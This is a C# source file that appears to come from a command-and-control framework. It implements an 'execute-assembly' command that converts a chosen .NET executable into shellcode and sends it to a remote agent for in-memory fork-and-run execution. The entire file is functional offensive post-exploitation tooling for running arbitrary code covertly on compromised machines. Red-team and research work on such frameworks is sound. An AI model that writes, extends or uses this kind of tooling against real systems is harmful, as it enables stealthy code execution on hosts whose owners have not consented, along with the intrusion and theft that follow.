using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Commands.Agent.EndPoint;
using Common;
using Common.Payload;
using Shared;

namespace Commander.Commands.Agent.Execute
{
    public class ExecuteAssemblyCommand : SimpleEndPointCommand
    {
        public override string Description => "Execute a dot net assembly in memory with Fork And Run mechanism";
        public override string Name => "execute-assembly";

        public override CommandId CommandId => CommandId.ForkAndRun;

        protected override async void InnerExecute(CommandContext context)
        {
            var agent = context.Executor.CurrentAgent;

            var args = context.CommandParameters.GetArgs();
            if (args.Length == 0)
            {
                context.Terminal.WriteLine($"Usage : {this.Name} ExePath [Arguments]");
                return;
            }

            var exePath = args[0];

            if (!File.Exists(exePath))
            {
                context.Terminal.WriteError($"File {exePath} not found");
                return;
            }

            string binFileName = string.Empty;
            var prms = context.CommandParameters.ExtractAfterParam(0).Trim();
            context.Terminal.WriteLine($"Generating payload with params {prms}...");

            var generator = new PayloadGenerator(context.Config.PayloadConfig, context.Config.SpawnConfig);
            binFileName = Path.Combine(context.Config.PayloadConfig.WorkingFolder, ShortGuid.NewGuid() + ".bin");
            var result = generator.GenerateBin(exePath, binFileName, agent.Metadata.Architecture == "x86", prms);

            if (result.Result != 0)
            {
                context.Terminal.WriteError($"Unable to generate shellcode : ");
                context.Terminal.WriteLine(result.Out);
                return;
            }

            byte[] fileBytes = null;

            using (FileStream fs = File.OpenRead(binFileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }
            File.Delete(binFileName);

            context.AddParameter(ParameterId.File, fileBytes);
            context.AddParameter(ParameterId.Name, Path.GetFileName(exePath));
            context.AddParameter(ParameterId.Output, true);

            base.CallEndPointCommand(context);

        }
    }
}
